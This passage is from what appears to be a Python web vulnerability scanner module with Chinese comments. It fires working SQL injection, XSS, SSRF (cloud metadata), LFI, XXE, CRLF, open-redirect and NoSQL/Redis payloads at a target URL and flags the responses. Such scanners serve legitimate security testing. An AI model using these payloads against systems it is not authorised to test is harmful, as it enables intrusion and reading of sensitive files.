        baseline_resp = requests.get(base_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
        baseline_length = len(baseline_resp.text)
    except Exception:
        baseline_length = 0
    
    for p in test_params:
        # 错误型注入检测
        for payload in error_payloads:
            try:
                if "?" in base_url:
                    test_url = f"{base_url}&{p}={payload}"
                else:
                    test_url = f"{base_url}?{p}={payload}"
                
                resp = requests.get(test_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                resp_lower = resp.text.lower()
                
                for pattern in error_patterns:
                    if pattern in resp_lower:
                        vulns.append({
                            "type": "Error-based SQLi",
                            "injection_type": "error",
                            "severity": "CRITICAL",
                            "param": p,
                            "payload": payload,
                            "evidence": pattern,
                            "url": test_url
                        })
                        break
            except Exception:
                pass
        
        if not deep_scan:
            continue
        
        # 时间盲注检测
        time_payloads = [
            ("' AND SLEEP(3)--", 3),
            ("'; WAITFOR DELAY '0:0:3'--", 3),
            ("' AND pg_sleep(3)--", 3),
        ]
        for payload, delay in time_payloads:
            try:
                if "?" in base_url:
                    test_url = f"{base_url}&{p}={payload}"
                else:
                    test_url = f"{base_url}?{p}={payload}"
                
                start = time.time()
                requests.get(test_url, timeout=delay + 5, verify=get_verify_ssl())
                elapsed = time.time() - start
                
                if elapsed >= delay:
                    vulns.append({
                        "type": "Time-based Blind SQLi",
                        "injection_type": "time",
                        "severity": "CRITICAL",
                        "param": p,
                        "payload": payload,
                        "evidence": f"响应延迟 {elapsed:.2f}s (预期 {delay}s)",
                        "url": test_url
                    })
                    break
            except Exception:
                pass
        
        # 布尔盲注检测
        bool_payloads = [
            ("' AND '1'='1", "' AND '1'='2"),
            ("' AND 1=1--", "' AND 1=2--"),
        ]
        for true_payload, false_payload in bool_payloads:
            try:
                if "?" in base_url:
                    true_url = f"{base_url}&{p}={true_payload}"
                    false_url = f"{base_url}&{p}={false_payload}"
                else:
                    true_url = f"{base_url}?{p}={true_payload}"
                    false_url = f"{base_url}?{p}={false_payload}"
                
                true_resp = requests.get(true_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                false_resp = requests.get(false_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                
                len_diff = abs(len(true_resp.text) - len(false_resp.text))
                if len_diff > baseline_length * 0.1 and len_diff > 50:
                    vulns.append({
                        "type": "Boolean-based Blind SQLi",
                        "injection_type": "boolean",
                        "severity": "HIGH",
                        "param": p,
                        "payload": f"TRUE: {true_payload} | FALSE: {false_payload}",
                        "evidence": f"响应长度差异: {len_diff} bytes",
                        "url": true_url
                    })
                    break
            except Exception:
                pass
    
    return {"success": True, "url": url, "vulnerabilities": vulns, "total": len(vulns), "deep_scan": deep_scan}


def xss_detect(url: str, param: str = None) -> dict:
    """XSS检测 - 独立顶层函数
    
    可通过 from tools.vuln_tools import xss_detect 直接导入使用
    """
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}
    
    vulns = []
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "javascript:alert(1)",
        "<body onload=alert(1)>"
    ]
    
    base_url = url
    test_params = [param] if param else ["search", "q", "query", "keyword", "name", "input", "text", "msg"]
    
    for p in test_params:
        for payload in payloads:
            try:
                if "?" in base_url:
                    test_url = f"{base_url}&{p}={requests.utils.quote(payload)}"
                else:
                    test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                
                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())
                
                if payload in resp.text or payload.replace('"', '&quot;') in resp.text:
                    vulns.append({
                        "type": "reflected",
                        "severity": "HIGH",
                        "param": p,
                        "payload": payload,
                        "url": test_url
                    })
                    break
            except Exception:
                pass
    
    return {"success": True, "url": url, "xss_vulns": vulns, "total": len(vulns)}


def ssrf_detect(url: str, param: str = None) -> dict:
    """SSRF检测 - 独立顶层函数
    
    可通过 from tools.vuln_tools import ssrf_detect 直接导入使用
    """
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}
    
    vulns = []
    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "file:///etc/passwd",
    ]
    
    test_params = [param] if param else ["url", "uri", "path", "src", "source", "link", "redirect", "target", "dest", "fetch", "proxy"]
    
    for p in test_params:
        for payload in payloads:
            try:
                if "?" in url:
                    test_url = f"{url}&{p}={requests.utils.quote(payload)}"
                else:
                    test_url = f"{url}?{p}={requests.utils.quote(payload)}"
                
                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl(), allow_redirects=False)
                
                indicators = [
                    "root:", "localhost", "127.0.0.1", "internal",
                    "ami-id", "instance-id", "meta-data",
                    "redis_version", "connected_clients"
                ]
                
                for indicator in indicators:
                    if indicator in resp.text.lower():
                        vulns.append({
                            "type": "basic",
                            "severity": "CRITICAL",
                            "param": p,
                            "payload": payload,
                            "evidence": indicator,
                            "url": test_url
                        })
                        break
            except Exception:
                pass
    
    return {"success": True, "url": url, "ssrf_vulns": vulns, "total": len(vulns)}


def lfi_detect_standalone(url: str, param: str = None) -> dict:
    """LFI检测 - 独立顶层函数
    
    可通过 from tools.vuln_tools import lfi_detect_standalone 直接导入使用
    """
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}
    
    vulns = []
    payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "/etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....\\\\....\\\\....\\\\windows\\win.ini",
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
    ]
    
    linux_indicators = ["root:", "daemon:", "bin:bash", "/bin/sh", "nobody:"]
    windows_indicators = ["[fonts]", "[extensions]", "[mci extensions]"]
    
    test_params = [param] if param else ["file", "path", "document", "page", "include", "template", "loc", "f"]
    
    for p in test_params:
        for payload in payloads:
            try:
                if "?" in url:
                    test_url = f"{url}&{p}={requests.utils.quote(payload)}"
                else:
                    test_url = f"{url}?{p}={requests.utils.quote(payload)}"
                
                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())
                
                # Linux 检测
                for indicator in linux_indicators:
                    if indicator in resp.text:
                        vulns.append({
                            "type": "LFI",
                            "severity": "HIGH",
                            "param": p,
                            "payload": payload,
                            "evidence": indicator,
                            "url": test_url,
                            "os": "linux"
                        })
                        break
                
                # Windows 检测
                for indicator in windows_indicators:
                    if indicator in resp.text:
                        vulns.append({
                            "type": "LFI",
                            "severity": "HIGH",
                            "param": p,
                            "payload": payload,
                            "evidence": indicator,
                            "url": test_url,
                            "os": "windows"
                        })
                        break
                        
            except Exception:
                pass
    
    return {"success": True, "url": url, "lfi_vulns": vulns, "total": len(vulns)}


def redirect_detect(url: str, param: str = None) -> dict:
    """开放重定向检测 - 独立顶层函数
    
    可通过 from tools.vuln_tools import redirect_detect 直接导入使用
    """
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}
    
    vulns = []
    payloads = [
        "https://evil.com",
        "//evil.com",
        "///evil.com",
        "////evil.com",
        "/\\evil.com",
        "https://evil.com%00.example.com",
        "https://example.com@evil.com",
        "https://evil.com#.example.com",
        "https://evil.com?.example.com",
    ]
    
    test_params = [param] if param else ["redirect", "url", "next", "target", "rurl", "dest", "destination", "return", "returnUrl", "go", "goto", "link", "ref"]
    
    for p in test_params:
        for payload in payloads:
            try:
                if "?" in url:
                    test_url = f"{url}&{p}={requests.utils.quote(payload)}"
                else:
                    test_url = f"{url}?{p}={requests.utils.quote(payload)}"
                
                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl(), allow_redirects=False)
                
                # 检查重定向
                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get("Location", "")
                    if "evil.com" in location:
                        vulns.append({
                            "type": "Open Redirect",
                            "severity": "MEDIUM",
                            "param": p,
                            "payload": payload,
                            "evidence": f"Redirects to: {location}",
                            "url": test_url
                        })
                        break
                        
                # 检查 JavaScript 重定向
                if "evil.com" in resp.text and ("window.location" in resp.text or "location.href" in resp.text):
                    vulns.append({
                        "type": "Open Redirect (JS)",
                        "severity": "MEDIUM",
                        "param": p,
                        "payload": payload,
                        "evidence": "JavaScript redirect detected",
                        "url": test_url
                    })
                    break
                    
            except Exception:
                pass
    
    return {"success": True, "url": url, "redirect_vulns": vulns, "total": len(vulns)}


def crlf_detect(url: str, param: str = None) -> dict:
    """CRLF注入检测 - 独立顶层函数
    
    可通过 from tools.vuln_tools import crlf_detect 直接导入使用
    """
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}
    
    vulns = []
    # CRLF payload - 尝试注入自定义响应头
    payloads = [
        "%0d%0aSet-Cookie:%20crlf=injection",
        "%0d%0aX-Injected:%20true",
        "%0a%0dSet-Cookie:%20crlf=injection",
        "\r\nSet-Cookie: crlf=injection",
        "%0d%0a%0d%0a<html>injected</html>",
        "%E5%98%8A%E5%98%8DSet-Cookie:%20crlf=injection",  # UTF-8 编码绕过
    ]
    
    test_params = [param] if param else ["url", "redirect", "next", "return", "view", "page"]
    
    for p in test_params:
        for payload in payloads:
            try:
                if "?" in url:
                    test_url = f"{url}&{p}={payload}"
                else:
                    test_url = f"{url}?{p}={payload}"
                
                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl(), allow_redirects=False)
                
                # 检查是否成功注入 header
                if "crlf" in resp.headers.get("Set-Cookie", "").lower():
                    vulns.append({
                        "type": "CRLF Injection",
                        "severity": "MEDIUM",
                        "param": p,
                        "payload": payload,
                        "evidence": "Injected Set-Cookie header",
                        "url": test_url
                    })
                    break
                
                if resp.headers.get("X-Injected", "").lower() == "true":
                    vulns.append({
                        "type": "CRLF Injection",
                        "severity": "MEDIUM",
                        "param": p,
                        "payload": payload,
                        "evidence": "Injected X-Injected header",
                        "url": test_url
                    })
                    break
                
                # HTTP Response Splitting
                if "<html>injected</html>" in resp.text:
                    vulns.append({
                        "type": "HTTP Response Splitting",
                        "severity": "HIGH",
                        "param": p,
                        "payload": payload,
                        "evidence": "Response body injection",
                        "url": test_url
                    })
                    break
                    
            except Exception:
                pass
    
    return {"success": True, "url": url, "crlf_vulns": vulns, "total": len(vulns)}


# ============ 任务队列 _impl 函数（供 task_tools.py 异步调用） ============

def _vuln_check_impl(url: str) -> dict:
    """综合漏洞检测实现 - 供任务队列调用
    
    执行基础漏洞检测：目录遍历、信息泄露、CORS、安全头、HTTP方法
    """
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}
    
    vulns = []
    
    # 1. 检测目录遍历
    try:
        test_url = url.rstrip('/') + "/../../../etc/passwd"
        resp = requests.get(test_url, timeout=5, verify=get_verify_ssl())
        if "root:" in resp.text:
            vulns.append({"type": "Path Traversal", "severity": "HIGH", "url": test_url})
    except Exception:
        pass
    
    # 2. 检测信息泄露
    info_paths = [".git/config", ".env", "phpinfo.php", "server-status"]
    for path in info_paths:
        try:
            test_url = url.rstrip('/') + "/" + path
            resp = requests.get(test_url, timeout=5, verify=get_verify_ssl())
            if resp.status_code == 200 and len(resp.content) > 100:
                vulns.append({"type": "Information Disclosure", "severity": "MEDIUM", "url": test_url, "path": path})
        except Exception:
            pass
    
    # 3. 检测CORS配置
    try:
        resp = requests.get(url, headers={"Origin": "https://evil.com"}, timeout=5, verify=get_verify_ssl())
        if "access-control-allow-origin" in resp.headers:
            origin = resp.headers.get("access-control-allow-origin")
            if origin == "*" or origin == "https://evil.com":
                vulns.append({"type": "CORS Misconfiguration", "severity": "MEDIUM", "detail": f"ACAO: {origin}"})
    except Exception:
        pass
    
    return {"success": True, "url": url, "vulnerabilities": vulns, "total": len(vulns)}


def _sqli_detect_impl(url: str, param: str = None) -> dict:
    """SQL注入检测实现 - 供任务队列调用"""
    return sqli_detect(url, param=param, deep_scan=False)


def _xss_detect_impl(url: str, param: str = None) -> dict:
    """XSS检测实现 - 供任务队列调用"""
    return xss_detect(url, param=param)


def _lfi_detect_impl(url: str, param: str = None) -> dict:
    """LFI检测实现 - 供 pentest_tools 调用"""
    result = lfi_detect_standalone(url, param=param)
    # 转换格式以适配 pentest_tools 的期望
    return {
        "success": result.get("success", False),
        "vulnerable": result.get("total", 0) > 0,
        "lfi_vulns": result.get("lfi_vulns", [])
    }


def _csrf_detect_impl(url: str) -> dict:
    """CSRF检测实现 - 供 pentest_tools 调用"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests"}
    
    try:
        resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        html = resp.text.lower()
        
        # 检查是否有表单
        has_form = "<form" in html
        has_csrf_token = any(pattern in html for pattern in [
            "csrf", "_token", "authenticity_token", "csrfmiddlewaretoken"
        ])
        
        vulnerable = has_form and not has_csrf_token
        return {
            "success": True,
            "vulnerable": vulnerable,
            "has_form": has_form,
            "has_csrf_token": has_csrf_token
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _ssrf_detect_impl(url: str, param: str = None) -> dict:
    """SSRF检测实现 - 供 pentest_tools 调用"""
    result = ssrf_detect(url, param=param)
    return {
        "success": result.get("success", False),
        "vulnerable": result.get("total", 0) > 0,
        "ssrf_vulns": result.get("ssrf_vulns", [])
    }


def _xxe_detect_impl(url: str) -> dict:
    """XXE检测实现 - 供 pentest_tools 调用"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests"}
    
    # 简单的XXE检测
    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    ]
    
    vulnerable = False
    try:
        for payload in xxe_payloads:
            resp = requests.post(
                url, 
                data=payload, 
                headers={"Content-Type": "application/xml"},
                timeout=10,
                verify=get_verify_ssl()
            )
            if "root:" in resp.text or "[fonts]" in resp.text:
                vulnerable = True
                break
        
        return {"success": True, "vulnerable": vulnerable}
    except Exception as e:
        return {"success": False, "error": str(e)}


def _security_headers_check_impl(url: str) -> dict:
    """安全头检测实现 - 供 pentest_tools 调用"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests"}
    
    required_headers = [
        "X-Frame-Options",
        "X-Content-Type-Options",
        "X-XSS-Protection",
        "Content-Security-Policy",
        "Strict-Transport-Security"
    ]
    
    try:
        resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        headers = resp.headers
        
        missing = [h for h in required_headers if h.lower() not in [k.lower() for k in headers.keys()]]
        
        return {
            "success": True,
            "missing_headers": missing,
            "present_headers": [h for h in required_headers if h not in missing],
            "score": (len(required_headers) - len(missing)) / len(required_headers) * 100
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _cors_deep_check_impl(url: str) -> dict:
    """CORS配置检测实现 - 供 pentest_tools 调用"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests"}
    
    vulnerable = False
    issues = []
    
    try:
        # 测试 Origin 反射
        resp = requests.get(
            url, 
            headers={"Origin": "https://evil.com"},
            timeout=10,
            verify=get_verify_ssl()
        )
        
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
        
        if acao == "*":
            vulnerable = True
            issues.append("ACAO 设置为 *")
        elif acao == "https://evil.com":
            vulnerable = True
            issues.append("ACAO 反射任意 Origin")
        
        if acac.lower() == "true" and vulnerable:
            issues.append("允许携带凭证")
        
        return {
            "success": True,
            "vulnerable": vulnerable,
            "issues": issues,
            "acao": acao,
            "acac": acac
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


# ============ NoSQL 注入检测独立函数 ============

def nosql_detect(url: str, param: str = None, db_type: str = "auto") -> dict:
    """NoSQL注入检测 - 独立顶层函数
    
    支持 MongoDB/Redis/Elasticsearch 注入检测
    可通过 from tools.vuln_tools import nosql_detect 直接导入使用
    
    Args:
        url: 目标URL
        param: 可选，指定检测的参数名
        db_type: 数据库类型 (auto/mongodb/redis/elasticsearch)
    """
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}
    
    vulns = []
    
    # MongoDB 字符串 Payload
    mongodb_str_payloads = [
        "' || '1'=='1",
        '{"$gt": ""}',
        '[$ne]=1',
        '[$gt]=',
        '[$regex]=.*',
    ]
    
    # MongoDB 错误特征
    mongodb_errors = [
        "MongoError", "mongo", "MongoDB", "BSON", 
        "ObjectId", "query selector", "$where"
    ]
    
    # Redis 注入 Payload
    redis_payloads = [
        "\r\nPING\r\n",
        "\r\nINFO\r\n",
    ]
    
    # Redis 响应特征
    redis_indicators = ["PONG", "redis_version", "+OK"]
    
    base_url = url
    test_params = [param] if param else ["id", "user", "search", "q", "query"]
    
    for p in test_params:
        # MongoDB 检测
        if db_type in ["auto", "mongodb"]:
            for payload in mongodb_str_payloads:
                try:
                    if "?" in base_url:
                        test_url = f"{base_url}&{p}={requests.utils.quote(str(payload))}"
                    else:
                        test_url = f"{base_url}?{p}={requests.utils.quote(str(payload))}"
                    
                    resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())
                    resp_lower = resp.text.lower()
                    
                    for error in mongodb_errors:
                        if error.lower() in resp_lower:
                            vulns.append({
                                "type": "MongoDB Injection",
                                "severity": "HIGH",
                                "param": p,
                                "payload": str(payload),
                                "evidence": error,
                                "url": test_url
                            })
                            break
                except Exception:
                    pass
        
        # Redis 检测
        if db_type in ["auto", "redis"]:
            for payload in redis_payloads:
                try:
                    if "?" in base_url:
                        test_url = f"{base_url}&{p}={requests.utils.quote(payload)}"
                    else:
                        test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                    
                    resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())
                    
                    for indicator in redis_indicators:
                        if indicator in resp.text:
                            vulns.append({
                                "type": "Redis Injection",
                                "severity": "CRITICAL",
                                "param": p,
                                "payload": payload.replace("\r\n", "\\r\\n"),
                                "evidence": indicator,
                                "url": test_url
                            })
                            break
                except Exception:
                    pass
    
    return {
        "success": True,
        "url": url,
        "db_type": db_type,
        "nosql_vulns": vulns,
        "total": len(vulns)
    }


def _nosql_detect_impl(url: str, param: str = None, db_type: str = "auto") -> dict:
    """NoSQL注入检测实现 - 供 pentest_tools / web_scan_tools 调用"""
    result = nosql_detect(url, param=param, db_type=db_type)
    return {
        "success": result.get("success", False),
        "vulnerable": result.get("total", 0) > 0,
        "nosql_vulns": result.get("nosql_vulns", [])
    }




